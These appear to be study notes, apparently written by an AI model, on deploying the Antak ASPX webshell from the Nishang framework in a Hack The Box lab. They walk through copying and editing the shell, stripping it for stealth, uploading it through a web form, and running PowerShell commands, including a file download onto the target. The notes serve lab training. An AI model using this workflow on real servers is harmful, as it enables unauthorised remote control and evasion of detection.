## 1. ASPX Basics

- **ASPX (Active Server Pages Extended)** is part of the **Microsoft ASP.NET framework**.
    
- Used to render **dynamic HTML pages** using server-side code.
    
- When uploaded or injected, an ASPX webshell allows **remote command execution** on Windows servers.
    

---

## 2. Learning Resources

- Use [ippsec.rocks](https://ippsec.rocks/) to search through HTB walkthrough videos.
    
- Search for terms like:
    
    - `aspx`
        
    - `webshell`
        
    - `Antak`
        
- **Recommended Video:** Retired HTB box **Cereal** — watch from **1:17:00 to 1:20:00** for an ASPX webshell example.
    

---

## 3. What is Antak Webshell

- **Antak** is an ASPX-based webshell from the **Nishang framework**.
    
- Built to interact with PowerShell for post-exploitation tasks.
    

**Key Capabilities:**

- Encode and execute PowerShell scripts
    
- Upload and download files
    
- Execute SQL queries
    
- Parse `web.config` files for stored credentials
    

**Location on Kali/Parrot:**

```bash
/usr/share/nishang/Antak-WebShell/
```

---

## 4. Workflow to Use Antak Webshell

### Step 1: Copy the Shell for Editing

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

---

### Step 2: Modify Credentials

Edit `Upload.aspx`:

```csharp
if(Request["username"] == "htb-student" && Request["password"] == "htb-student")
```

**Optional for Stealth:**

- Remove ASCII art.
    
- Strip verbose comments or unused code.
    

---

### Step 3: Update `/etc/hosts`

To resolve the internal domain:

```bash
sudo nano /etc/hosts
```

Add:

```
<target-ip> status.inlanefreight.local
```

---

### Step 4: Upload the ASPX File

Use the **upload form** on the target web app:

- Files are stored in the `\\files\\` directory.
    
- Example URL:
    

```
http://status.inlanefreight.local/files/Upload.aspx
```

---

### Step 5: Access the Web Shell

- Open the URL in your browser.
    
- Log in with your set credentials (example: `htb-student / htb-student`).
    
- You should see the **Antak interface**.
    

---

## 5. Features of Antak Webshell

- PowerShell command input panel
    
- Upload and download support
    
- Base64 encoding and script execution
    
- Command buttons:
    
    - **Clear**
        
    - **Help**
        
    - **Parse web.config**
        
    - **Upload/Download**
        
    - **SQL Execution**
        

**Execution Behavior:**  
Each command runs as a **new PowerShell process**.

---

## 6. Example Commands

**Basic Enumeration**

```powershell
whoami
Get-Process
```

**File and Directory Management**

```powershell
Get-ChildItem -Path C:\
```

**Networking and Requests**

```powershell
Invoke-WebRequest -Uri http://example.com/file.txt -OutFile C:\Users\Public\file.txt
```

**Remote Command Execution**

```powershell
Invoke-Command -ScriptBlock { Get-Service }
```

**Get Help**

```powershell
help
```

---

## 7. Why Use Antak

- Prebuilt and easy to deploy.
    
- Integrates **PowerShell** for flexible post-exploitation tasks.
    
- Supports file transfer and script execution out-of-the-box.
    
- Can be easily customized to evade detection.
    

---

Would you like me to prepare a **cheat sheet of common PowerShell commands** to use effectively within Antak?